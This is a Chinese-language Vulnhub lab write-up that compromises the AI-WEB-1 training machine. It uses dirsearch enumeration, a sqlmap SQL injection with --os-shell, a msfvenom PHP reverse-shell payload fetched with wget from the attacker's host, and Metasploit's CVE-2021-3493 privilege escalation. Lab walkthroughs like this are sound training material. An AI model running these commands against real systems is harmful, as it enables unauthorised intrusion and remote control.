---
title: Vulnhub靶场笔记-AI-WEB1
date: 2023-11-12 18:53:00 +0800
img_path: /
categories: [肾透, Vulnhub靶场]
tags: [肾透, Vulnhub靶场]     # TAG names should always be lowercase
---


# AI-WEB-1

## 一、环境配置

更改网络适配器为NAT模式

![image-20231112181712223](assets/image-20231112181712223.png)

## 二、主机探测

在物理机中查看VMnet8网卡

![image-20231108145349160](assets/image-20231108145349160.png)

使用`fscan`探测AI-WEB-2靶机ip地址为：192.168.157.137

![image-20231112182409300](assets/image-20231112182409300.png)

![image-20231112182449516](assets/image-20231112182449516.png)

## 三、WEB信息收集

```bash
dirsearch -u http://192.168.157.137/
```

![image-20231112182621097](assets/image-20231112182621097.png)

![image-20231112182649777](assets/image-20231112182649777.png)

```sh
dirsearch -u http://192.168.157.137/m3diNf0/
dirsearch -u http://192.168.157.137/se3reTdir777/uploads/
dirsearch -u http://192.168.157.137/se3reTdir777/
```

![image-20231112183629364](assets/image-20231112183629364.png)

`http://192.168.157.137/m3diNf0/info.php`

![image-20231112183716479](assets/image-20231112183716479.png)

![image-20231112183149744](assets/image-20231112183149744.png)

![image-20231112183243042](assets/image-20231112183243042.png)

`http://192.168.157.137/se3reTdir777/index.php`

![image-20231112183502398](assets/image-20231112183502398.png)

## 四、SQL注入

存在sql注入漏洞

![image-20231112183839509](assets/image-20231112183839509.png)

`sqlmap`一把梭，注意到是`post`传参抓包获取POST的`data`数据 ：`uid=1+%E2%80%98+or+1%3D1%23&Operation=Submit`

![image-20231112184032245](assets/image-20231112184032245.png)

```sh
sqlmap -u "http://192.168.157.137/se3reTdir777/" --data="uid=1'or1=1#&Operation=Submit"  --os-shell
```

在`info.php`中得知`web`目录：`/home/www/html/web1x443290o2sdf92213 `

![image-20231112184457427](assets/image-20231112184457427.png)

经测试`/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/`能写入`webshell`

![image-20231112184750316](assets/image-20231112184750316.png)

## 五、上线MSF

生成`php`木马

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.157.138 LPORT=4444 R > shell.php
```

`msf`监听

```sh
use exploit/multi/handler
set LHOST 192.168.157.138
set payload php/meterpreter/reverse_tcp
```

利用`os-shell`远程下载生成的`php`木马

启动HTTP服务：`python -m http.server 8888`

远程下载：`wget http://192.168.157.138:8888/shell.php`

![image-20231112190112009](assets/image-20231112190112009.png)

访问`shell.php`

![image-20231112191324533](assets/image-20231112191324533.png)

## 六、提权拿Flag

查看主机信息

![image-20231112191517383](assets/image-20231112191517383.png)

上线后按`CTRL+Z`选择`y`保存`session`

![image-20231112191735649](assets/image-20231112191735649.png)

使用`cve-2021-3493`提权

```sh
search cve-2021-3493
use 0
set SESSION 0
run
```

![image-20231112192011460](assets/image-20231112192011460.png)

查看Flag

![image-20231112192105695](assets/image-20231112192105695.png)
